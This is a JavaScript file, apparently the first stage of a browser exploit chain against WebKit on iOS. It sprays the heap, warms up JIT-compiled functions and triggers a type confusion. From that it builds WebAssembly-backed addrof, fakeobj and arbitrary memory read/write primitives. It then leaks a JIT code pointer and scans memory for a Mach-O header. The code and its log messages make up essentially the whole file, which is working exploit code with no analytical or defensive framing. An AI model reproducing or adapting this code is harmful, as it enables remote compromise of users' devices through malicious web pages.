





















let r = {};





const {
    N: G, 
    tn: W, 
    nn: C, 
    Vt: m, 
    U: j, 
    An: S, 
    vn: O, 
    v: o, 
    I: u, 
    B: s 
  } = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),

  
  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"),
  
  utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");


















class J  {

  
  addrof(t) {
    return utilityModule.K(this.getObjectAddress(t));
  }

  
  readStringFromInt64(t, e = 256) {
    const r = utilityModule.O(t.yt());
    return this.readString(r, e);
  }

  
  readInt64FromOffset(t) {
    const e = this.read32(utilityModule.O(t)),
      r = this.read32(utilityModule.O(t + 4));
    return new utilityModule.Int64(e, r);
  }

  
  read32FromInt64(t) {
    return this.read32(utilityModule.O(t.yt()));
  }

  
  readInt64FromInt64(t) {
    return this.readInt64FromOffset(t.yt());
  }

  
  writeInt64ToOffset(t, e) {
    const r = utilityModule.O(t),
      n = e.Nt();
    this.write64(r, n);
  }

  




  readDoubleAsPointer(t, e = !1) {
    const r = this.read32(utilityModule.O(t));
    let n = this.read32(utilityModule.O(t + 4));
    return (!0 === e || platformModule.platformState.versionFlags.zohDDd) && (n &= o), utilityModule.T(r, n);
  }

  
  readRawBigInt(t) {
    return this.readInt64FromOffset(t).yt();
  }

  
  busyWait(t, e = 768) {
    for (let t = 0; t < e; t += 8);
  }

  
  copyBigInt(t, e) {
    this.write64(utilityModule.O(t), utilityModule.O(e));
  }

  




  fakeobj(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    const e = this.getObjectAddress(t);
    return utilityModule.K(S(this.read64(e + j(platformModule.platformState.versionFlags.iWQGB1))));
  }

  




  withTempOverrides(t, ...e) {
    const r = new Array(e.length + 10);
    for (let t = 0; t < e.length; t++) r[t] = this.readInt64FromOffset(e[t].Ir);
    try {
      for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, e[t].Zt);
      t();
    } finally {
      for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, r[t]);
    }
  }

  constructor() {
    













    const t = new Uint8Array([
      0, 97, 115 , 109 , 1, 0, 0, 0, 
      1, 9, 2, 96, 0, 1, 126 , 96, 1, 126 , 0,
      3, 3, 2, 0, 1,
      4, 4, 1, 111 , 0, 1,
      5, 3, 1, 0, 1,
      6, 82, 8, 
      123 , 1, 253, 12, 
      51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51,
      11, 126 , 1, 66,
      205, 215, 182, 222, 218, 249, 234, 230, 171, 127,
      11, 123 , 1, 253, 12,
      51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51, 51,
      11, 111 , 1, 208, 111,
      11, 111, 1, 208, 111,
      11, 111, 1, 208, 111,
      11, 111, 1, 208, 111,
      11, 111, 1, 208, 111,
      11,
      7, 29, 4, 4,
      101, 100, 102, 121, 
      3, 1, 6,
      109, 101, 109, 111, 114, 121, 
      2, 0, 3,
      98, 116, 108, 
      0, 0, 3,
      97, 108, 116, 
      0, 1,
      10, 13, 2, 4, 0, 35, 1, 11, 
      6, 0, 32, 0, 36, 1, 11 
      ]),
      e = (t) => t.exports.btl(),
      r = (t, e) => {t.exports.alt(e);};

    this.ts = []; 

    const n = new WebAssembly.Module(t, {});
    
    this.es = new WebAssembly.Instance(n, {});
    this.es[0] = 3; 
    this.rs = e.bind(null, this.es); 
    this.ns = r.bind(null, this.es); 

    this.ss = new WebAssembly.Instance(n, {});
    this.ss[0] = 3;
    this.ls = e.bind(null, this.ss); 
    this.hs = r.bind(null, this.ss); 

    
    this.os = [{}, 1, 8];
    this.os.q23 = 90; 

    
    this.Qi = new ArrayBuffer(16);
    this.fs = new Uint32Array(this.Qi);
    this.cs = new BigUint64Array(this.Qi);
    this.bs = new ArrayBuffer(32);
    this.us = new DataView(this.bs);

    this.Oi = new C(); 

    
    const i = 0n;
    for (let t = 0; t < 1; t++) this.rs(), this.ls(), this.ns(i), this.hs(i);
  }

  




  storeExploitState(t, e, r, n, i) {
    this.ws = this.Oi.Bn(t);
    this.ds = this.Oi.Bn(e);
    this.ys = this.Oi.Bn(r);
    this.As = this.Oi.Bn(n);
    this.Us = this.Oi.Bn(i);
  }

  
  cleanup() {}

  
  writeToInstanceA(t) {this.ns(t);}

  
  writeAndRead(t) {return this.writeToInstanceA(t), this.ls();}

  
  writeAndWrite(t, e) {return this.writeToInstanceA(t), this.hs(e);}

  
  read64(t) {return this.cs[0] = this.writeAndRead(t), this.cs[0];}

  




  getBackingStore(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    t instanceof DataView && (t = new Uint8Array(t.buffer));
    const e = this.getObjectAddress(t);
    return S(this.read64(e + BigInt(platformModule.platformState.versionFlags.oGn3OG)));
  }

  




  getJITCodePointer(t) {
    if (!(t instanceof Function)) throw new Error("!(t instanceof Function)");
    const e = this.getObjectAddress(t);
    return this.read64(e + BigInt(platformModule.platformState.versionFlags.KaU4Z7));
  }

  




  write32(t, e) {
    if ("bigint" != typeof t) return this.write32(utilityModule.O(t), e);
    {
      const r = this.read64(t);
      this.cs[0] = r;
      this.fs[0] = e;
      const n = this.cs[0];
      this.writeAndWrite(t, n);
    }
  }

  




  allocCString(t) {
    const e = new Uint8Array(new ArrayBuffer(t.length + 1));
    for (let r = 0; r < t.length; r++) e[r] = t.charCodeAt(r);
    return [e, this.getDataPointer(e)];
  }

  



  allocZeroBuffer(t) {
    const e = new Uint8Array(new ArrayBuffer(Number(t))),
      r = this.getDataPointer(e);
    return this.ts.push(e), r;
  }

  



  allocZeroBufferPair(t) {
    const e = new Uint8Array(new ArrayBuffer(Number(t))),
      r = this.getDataPointer(e);
    return this.ts.push(e), [e, r];
  }

  



  getDataPointer(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    const e = this.getObjectAddress(t);
    return S(this.read64(e + 0x10n));
  }

  




  patchByte(t, e) {
    this.us.setBigUint64(0, this.read64(t), !0);
    this.us.setUint8(0, e, !0);
    this.write64(t, this.us.getBigUint64(0, !0));
  }

  



  readString(t, e = 768) {
    let r = t;
    "number" == typeof t && (r = utilityModule.O(t));
    let n = "";
    for (let t = 0; t < e; t++) {
      const e = this.readByte(r + BigInt(t));
      if (0 === e) break;
      n += String.fromCharCode(e);
    }
    return n;
  }

  
  readByte(t) {return 255 & this.read32(t);}

  
  read32(t) {
    return "bigint" == typeof t ? (
    this.cs[0] = this.writeAndRead(t), this.fs[0]) :
    this.read32(utilityModule.O(t));
  }

  
  write64(t, e) {return this.writeAndWrite(t, e);}

  




  getObjectAddress(t) {
    this.os[0] = t;
    const e = this.read64(this.Us + 0x8n),
      r = this.read64(e);
    return this.os[0] = null, r;
  }
}















class $  {

  
  addrof(t) {return utilityModule.K(this.getObjectAddress(t));}

  
  readStringFromInt64(t, e = 256) {
    const r = utilityModule.O(t.yt());
    return this.readString(r, e);
  }

  
  readInt64FromOffset(t) {
    const e = this.read32(utilityModule.O(t)),
      r = this.read32(utilityModule.O(t + 4));
    return new utilityModule.Int64(e, r);
  }

  
  read32FromInt64(t) {return this.read32(utilityModule.O(t.yt()));}

  
  readInt64FromInt64(t) {return this.readInt64FromOffset(t.yt());}

  
  writeInt64ToOffset(t, e) {
    const r = utilityModule.O(t),
      n = e.Nt();
    this.write64(r, n);
  }

  
  readDoubleAsPointer(t, e = !1) {
    const r = this.read32(utilityModule.O(t));
    let n = this.read32(utilityModule.O(t + 4));
    return (!0 === e || platformModule.platformState.versionFlags.zohDDd) && (n &= o), utilityModule.T(r, n);
  }

  
  readRawBigInt(t) {return this.readInt64FromOffset(t).yt();}

  
  busyWait(t, e = 768) {for (let t = 0; t < e; t += 8);}

  
  copyBigInt(t, e) {this.write64(utilityModule.O(t), utilityModule.O(e));}

  
  fakeobj(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    const e = this.getObjectAddress(t);
    return utilityModule.K(S(this.read64(e + j(platformModule.platformState.versionFlags.iWQGB1))));
  }

  
  withTempOverrides(t, ...e) {
    const r = new Array(e.length + 10);
    for (let t = 0; t < e.length; t++) r[t] = this.readInt64FromOffset(e[t].Ir);
    try {
      for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, e[t].Zt);
      t();
    } finally {
      for (let t = 0; t < e.length; t++) this.writeInt64ToOffset(e[t].Ir, r[t]);
    }
  }

  constructor() {
    






    const t = new Uint8Array([
      0, 97, 115 , 109 , 1, 0, 0, 0, 
      1, 9, 2, 96, 0, 1, 126 , 96, 1, 126 , 0,
      3, 3, 2, 0, 1,
      4, 4, 1, 111 , 0, 1,
      5, 3, 1, 0, 1,
      6, 16, 3, 
      126 , 1, 66, 0, 11,
      126 , 1, 66, 0, 11,
      126 , 1, 66, 0, 11,
      7, 22, 3, 6,
      109, 101, 109, 111, 114, 121, 
      2, 0, 3,
      98, 116, 108, 
      0, 0, 3,
      97, 108, 116, 
      0, 1,
      10, 13, 2, 4, 0, 35, 0, 11, 
      6, 0, 32, 0, 36, 0, 11 
      ]),
      e = (t) => t.exports.btl(),
      r = (t, e) => {t.exports.alt(e);};

    this.ts = [];

    const n = new WebAssembly.Module(t, {});
    this.es = new WebAssembly.Instance(n, {});
    this.es[0] = 3;
    this.rs = e.bind(null, this.es);
    this.ns = r.bind(null, this.es);

    this.ss = new WebAssembly.Instance(n, {});
    this.ss[0] = 3;
    this.ls = e.bind(null, this.ss);
    this.hs = r.bind(null, this.ss);

    this.os = [{}, 1, 8];
    this.os.q23 = 90;

    this.Qi = new ArrayBuffer(16);
    this.fs = new Uint32Array(this.Qi);
    this.cs = new BigUint64Array(this.Qi);
    this.bs = new ArrayBuffer(32);
    this.us = new DataView(this.bs);

    this.Oi = new C();

    
    const i = 0n;
    for (let t = 0; t < 22; t++) this.rs(), this.ls(), this.ns(i), this.hs(i);
  }

  
  storeExploitState(t, e, r, n, i) {
    this.ws = this.Oi.Bn(t);
    this.Ws = this.Oi.Bn(e);
    this.ys = this.Oi.Bn(r);
    this.js = this.Oi.Bn(n);
    this.Us = this.Oi.Bn(i);
  }

  cleanup() {}
  writeToInstanceA(t) {this.ns(t);}
  writeAndRead(t) {return this.writeToInstanceA(t), this.ls();}
  writeAndWrite(t, e) {return this.writeToInstanceA(t), this.hs(e);}
  read64(t) {return this.cs[0] = this.writeAndRead(t), this.cs[0];}

  
  getBackingStore(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    t instanceof DataView && (t = new Uint8Array(t.buffer));
    const e = this.getObjectAddress(t);
    return S(this.read64(e + BigInt(platformModule.platformState.versionFlags.oGn3OG)));
  }

  
  getJITCodePointer(t) {
    if (!(t instanceof Function)) throw new Error("!(t instanceof Function)");
    const e = this.getObjectAddress(t);
    return this.read64(e + BigInt(platformModule.platformState.versionFlags.KaU4Z7));
  }

  
  write32(t, e) {
    if ("bigint" != typeof t) return this.write32(utilityModule.O(t), e);
    {
      const r = this.read64(t);
      this.cs[0] = r;
      this.fs[0] = e;
      const n = this.cs[0];
      this.writeAndWrite(t, n);
    }
  }

  
  allocCString(t) {
    const e = new Uint8Array(new ArrayBuffer(t.length + 1));
    for (let r = 0; r < t.length; r++) e[r] = t.charCodeAt(r);
    return [e, this.getDataPointer(e)];
  }

  
  allocZeroBuffer(t) {
    const e = new Uint8Array(new ArrayBuffer(Number(t))),
      r = this.getDataPointer(e);
    return this.ts.push(e), r;
  }

  






  allocControlledBuffer(t, e = !1) {
    let r = new ArrayBuffer(t),
      n = new Uint8Array(r);
    utilityModule.D(r); 
    let i = this.addrof(n),
      s = this.readDoubleAsPointer(i + platformModule.platformState.versionFlags.oGn3OG);
    if (!0 === e) {
      let t = this.addrof(r),
        e = this.readDoubleAsPointer(t + platformModule.platformState.versionFlags.CN3rr_),
        n = this.read32(e + platformModule.platformState.versionFlags.EMDU4o);
      n += 32;
      this.write32(e + platformModule.platformState.versionFlags.EMDU4o, n);
    }
    return s;
  }

  
  allocZeroBufferPair(t) {
    const e = new Uint8Array(new ArrayBuffer(Number(t))),
      r = this.getDataPointer(e);
    return this.ts.push(e), [e, r];
  }

  
  getDataPointer(t) {
    t instanceof ArrayBuffer && (t = new Uint8Array(t));
    const e = this.getObjectAddress(t);
    return S(this.read64(e + 0x10n));
  }

  



  copyMemory32(t, e, r) {
    if (r % 4 != 0) throw new Error("r % 4 != 0");
    for (let n = 0; n < r; n += 4)
    this.write32(t.Nt() + BigInt(n), this.read32(e.Nt() + BigInt(n)));
  }

  
  patchByte(t, e) {
    this.us.setBigUint64(0, this.read64(t), !0);
    this.us.setUint8(0, e, !0);
    this.write64(t, this.us.getBigUint64(0, !0));
  }

  
  readString(t, e = 768) {
    let r = t;
    "number" == typeof t && (r = utilityModule.O(t));
    let n = "";
    for (let t = 0; t < e; t++) {
      const e = this.readByte(r + BigInt(t));
      if (0 === e) break;
      n += String.fromCharCode(e);
    }
    return n;
  }

  
  readByte(t) {return 255 & this.read32(t);}

  
  read32(t) {
    return "bigint" == typeof t ? (
    this.cs[0] = this.writeAndRead(t), this.fs[0]) :
    this.read32(utilityModule.O(t));
  }

  
  write64(t, e) {return this.writeAndWrite(t, e);}

  
  getObjectAddress(t) {
    this.os[0] = t;
    const e = this.read64(this.Us + 0x8n),
      r = this.read64(e);
    return this.os[0] = null, r;
  }
}











function V () {
  for (let t = 0; t < 240; t++) new ArrayBuffer(4194304 );
}






function H () {
  eval("new Uint32Array(10000000);");
}





















async function L (t) {
  window.log(`[STAGE1] === Stage 1: WASM Primitives starting ===`);
  const e = new Float64Array(10),
    r = new Int32Array(e.buffer),
    n = new Array(3000);

  
  window.log(`[STAGE1] Heap spray: allocating 7000 JSON objects...`);
  for (let t = 0; t < 7000; t++)
  n[t] = JSON.parse("{\"a" + t + "\": " + t + "}");

  window.log(`[STAGE1] Triggering JIT compilation + GC pressure...`);
  H(); 
  window.log(`[STAGE1] Heap spray: 240 × 4MB ArrayBuffers...`);
  V(); 

  
  const i = {
    j: { g: eval("(() => {return -NaN})()") }, 
    A: !1, 
    M: e, 
    xs: r, 
    Fs: platformModule.platformState.iOSVersion >= 160400 ? new J() : new $(), 
    Cs: { 
      vs: null, 
      Ds: null, 
      Os: null, 
      Ns: null, 
      Js: null, 
      $s: null, 
      Vs: null 
    },
    t: [[], [], [], []], 
    l: [1.1, 2.2, 3.1], 
    i: [.23, 2.2, 3.4], 
    k: null, 
    o: null, 
    m: null, 
    u: null, 
    Es: null, 
    h: null, 
    nr: null, 
    mi: null, 
    Gs: null, 
    Hs: new ArrayBuffer(16),
    Ls: null, 
    Rs: null, 
    Ks: 5242880 
  };
  Object.seal(i);

  
  
  
  const s = "x += 1; x += 1; x += 1; x += 1; x += 1; x += 1; x += 1;";
  let a = "";
  for (let t = 0; t < 7200; t++) a += s;

  



  const l = new Function(
    "func", "arg0", "arg1", "arg2", "arg3", "arg4",
    "\n        if(false) {\n            let x = 0;\n            " + a +
    "\n        }\n\n        return func(arg0, arg1, arg2, arg3, arg4);\n    "
  );

  window.log(`[STAGE1] Built megamorphic dispatch function (7200 dead-code iterations)`);
  i.u = l;
  i.Ls = new Uint32Array(i.Hs);
  i.Rs = new Float64Array(i.Hs);
  i.l.dw34 = 12; 
  i.i.x534 = 94;
  i.t[0] = i.Fs.es; 
  i.t[1] = i.Fs.ss; 
  i.t[2] = i.l; 
  i.t[3] = i.Fs.os; 

  const h = { a: 1, b: 2, c: 3, d: 4 };
  i.o = h;
  const o = Symbol();
  let f = [0];

  try {
    











    platformModule.platformState.exploitPrimitive = (() => {
      
      
      i.k = platformModule.platformState.iOSVersion >= 160400 ?
      
      function (t, e, r, n) {
        const i = t.u(t.nr, t, e, n + 8),
          s = t.u(t.nr, t, e, i),
          a = t.u(t.nr, t, e, i + 8),
          l = t.u(t.nr, t, e, i + 16),
          h = t.u(t.nr, t, e, i + 24),
          o = t.u(t.nr, t, e, l + 8),
          f = t.u(t.mi, t, e, l);
        t.Ks = f;
        const c = t.u(t.nr, t, e, s + platformModule.platformState.versionFlags.TryHSU),
          b = c + platformModule.platformState.versionFlags.cyTrSt,
          u = t.u(t.nr, t, e, a + platformModule.platformState.versionFlags.TryHSU),
          g = u + platformModule.platformState.versionFlags.cyTrSt,
          w = t.u(t.nr, t, e, b),
          d = t.u(t.nr, t, e, g);
        
        t.u(t.Gs, t, e, u + platformModule.platformState.versionFlags.ZHsObe, -0);
        t.u(t.Gs, t, e, c + platformModule.platformState.versionFlags.ZHsObe, -0);
        t.u(t.Gs, t, e, b, 5e-324 * g);
        
        for (let e = 0; e < 30; e++) t.u(t.nr, t, [1.1], o);
        for (let e = 0; e < 30; e++) t.u(t.Gs, t, [1.1], o, n + 8);
        for (let e = 0; e < 30; e++) t.u(t.mi, t, [1.1], o, 1.234);
        for (let e = 0; e < 30; e++) t.u(t.h, t, o);
        
        t.Cs.$s = c;
        t.Cs.Js = w;
        t.Cs.vs = u;
        t.Cs.Ns = d;
        t.Cs.Vs = h;
      } :
      
      (t, e, r, n) => {
        const i = t.u(t.nr, t, e, n + 8),
          s = t.u(t.nr, t, e, i),
          a = t.u(t.nr, t, e, i + 8),
          l = t.u(t.nr, t, e, i + 16),
          h = t.u(t.nr, t, e, i + 24),
          o = t.u(t.nr, t, e, l + 8),
          f = t.u(t.mi, t, e, l);
        t.Ks = f;
        const c = t.u(t.nr, t, e, s + platformModule.platformState.versionFlags.TryHSU),
          b = t.u(t.nr, t, e, a + platformModule.platformState.versionFlags.TryHSU),
          u = b + platformModule.platformState.versionFlags.FFwSQ4,
          g = c + platformModule.platformState.versionFlags.FFwSQ4,
          w = t.u(t.nr, t, e, g),
          d = t.u(t.nr, t, e, u);
        t.u(t.Gs, t, e, g, 5e-324 * u);
        t.u(t.nr, t, [1.1], o);
        t.u(t.Gs, t, [1.1], o, n + 8);
        t.u(t.mi, t, [1.1], o, 1.234);
        for (let e = 0; e < 30; e++) t.u(t.nr, t, [1.1], o);
        for (let e = 0; e < 30; e++) t.u(t.Gs, t, [1.1], o, n + 8);
        for (let e = 0; e < 30; e++) t.u(t.mi, t, [1.1], o, 1.234);
        for (let e = 0; e < 30; e++) t.u(t.h, t, o);
        t.Cs.$s = c;
        t.Cs.Os = w;
        t.Cs.vs = b;
        t.Cs.Ds = d;
        t.Cs.Vs = h;
      };

      




      i.Es = new Function("t", "n", "o", "c",
      "if(false) {return " + Math.random() + " + " + Math.random() +
      "} {const s=t.t;const e=t.o;const r=t.l;const f=t.i;" +
      "const l=new Array(o);for(let a=0;a<o;a++){" +
      "const o=a%2===0?r:f;" +
      "const i=[s,e,o,-2.5301706769843864e-98,2];let u=i;" +
      "if(c===false)u=n;l[a]=i;" +
      "if(u===n){const o=n[0];const s=n[1];const e=n[3];" +
      "if(!c||e===-2.7130486595895504e-98){" +
      "const c=o/5e-324;const e=s/5e-324;const r=e+20;" +
      "n[2]=r*5e-324;t.u(t.h,t,r);" +
      "t.u(t.k,t,l[a][2],r,c);l[a][2]=null;t.A=true;break" +
      "}}}t.M[0]=Math.min(t.j.g,t.j.g);return l}");

      const t = new Array(5000);
      for (let e = 0; e < t.length; e++) t[e] = [e, 1.1, 2.2, 3.3, 4.4, 5.5];

      const e = new Array(t.length);
      for (let r = 0; r < t.length; r++)
      r % 4 == 0 && 3001 !== r && (e[r] = t[r]);

      const n = {
          zs: () => t[3001], 
          qs() {
            t.length = 0;
            i.u(H);i.u(H);i.u(H);
          }
        },
        s = { length: 1, 0: 12 };

      function a() {
        arguments.length > 2 &&
        i.u(i.Es, i, arguments[3], arguments[4], arguments[5]);
      }

      
      
      
      Object.defineProperty(s, "3", { get: n.zs });
      Object.defineProperty(s, "4", { value: 10000 });
      Object.defineProperty(s, "5", { value: !0 });
      Object.defineProperty(s, "8", { get: n.qs });

      globalThis.inlinedFunction = a;
      i.m = a;

      
      
      
      const l = (t, e) => {
        const r = (e, r) => (t.Ls[0] = e, t.Ls[1] = r, t.Rs[0]);
        h.a = r(0, t.Ks - 131072 );
        h.b = r(7, (e >>> 0) - 131072);
        h.c = r(e / 4294967296 >>> 0, 1048575 );
        t.M[0] = Math.min(t.j.g, t.j.g);
      };
      i.h = l;

      
      window.log(`[STAGE1] JIT warmup: compiling pointer-setup primitive (100K iterations)...`);
      for (let t = 0; t < 100000 && (l(i, 1.1), !(i.xs[1] < 0)); t++);

      
      const o = (t, e, r) => (
      l(t, r + 8),
      t.M[0] = Math.min(t.j.g, t.j.g),
      0 | e.length);

      i.mi = o;
      for (let t = 0; t < 100000 && (i.u(o, i, i.i, 1.1), !(i.xs[1] < 0)); t++);

      
      const f = (t, e, r, n) => {
        t.u(l, t, r);
        e[0] = n;
        t.M[0] = Math.min(t.j.g, t.j.g);
      };
      i.Gs = f;
      for (let t = 0; t < 100000 && (i.u(f, i, i.i, 1.1, 1.1), !(i.xs[1] < 0)); t++);

      
      const c = (t, e, r) => {
        t.u(l, t, r);
        const n = e[0];
        return t.M[0] = Math.min(t.j.g, t.j.g), n / 5e-324;
      };
      i.nr = c;
      for (let t = 0; t < 100000 && (i.u(c, i, i.i, 1.1), !(i.xs[1] < 0)); t++);

      
      const b = new Function("n", "l",
      "if(false) {return " + Math.random() + " + " + Math.random() +
      "} {n.m.apply(null,l);n.M[0]=Math.min(n.j.g,n.j.g)}");

      const g = [],
        w = [.1, .1, .1, -2.7130486595895504e-98, -2.7130486595895504e-98],
        d = [1.1, 2.2, 3.3, -2.7130486595895504e-98, -2.7130486595895504e-98],
        y = [1.1, 1.1, 1.1, -2.7130486595895504e-98, -2.7130486595895504e-98];

      
      window.log(`[STAGE1] JIT warmup: speculation function (100K iterations)...`);
      for (let t = 0; t < 100000 && (
      g.push(i.u(i.Es, i, w, 4, t % 2 != 0)),
      !(r[1] < 0));
      t++) {
        const e = t % 2 == 0 ? y : d;
        for (let t = 0; t < e.length; t++) w[t] = e[t];
      }

      
      window.log(`[STAGE1] JIT warmup: trigger wrapper (1M iterations)...`);
      for (let t = 0; t < 1000000 && (i.u(b, i, s, 4), !(i.xs[1] < 0)); t++);

      
      
      
      
      window.log(`[STAGE1] >>> TRIGGERING TYPE CONFUSION <<<`);
      s.length = 9;
      i.A = !1;
      i.u(b, i, s);
      if (!i.A) {throw new Error("!i.A: Type confusion did not trigger");}
      window.log(`[STAGE1] Type confusion SUCCESS — addrof/fakeobj primitives active`);

      
      window.log(`[STAGE1] Storing exploit state addresses...`);
      let A = null;
      platformModule.platformState.iOSVersion >= 160400 ? (
      i.Fs.storeExploitState(i.Cs.vs, i.Cs.Ns, i.Cs.$s, i.Cs.Js, i.Cs.Vs), A = i.Fs) : (
      i.Fs.storeExploitState(i.Cs.vs, i.Cs.Ds, i.Cs.$s, i.Cs.Os, i.Cs.Vs), A = i.Fs);

      
      
      let U = A.getJITCodePointer(WebAssembly.Table);
      window.log(`[STAGE1] JIT code pointer: 0x${U.toString(16)}`);
      U &= u; 
      let _ = U - U % 0x1000n; 
      if (0n === _) throw new Error("0n === _");
      window.log(`[STAGE1] Scanning for Mach-O header (0xFEEDFACF) from 0x${_.toString(16)}...`);
      for (;;) {
        if (0xFEEDFACF  === A.read32(_)) break;
        _ -= BigInt(4096); 
      }
      window.log(`[STAGE1] Found Mach-O header at 0x${_.toString(16)}`);
      window.log(`[STAGE1] === Stage 1 complete ===`);
      return A;
    })();
  } catch (t) {
    throw platformModule.platformState.exploitPrimitive = void 0, t;
  }
}






return r.si = L, r;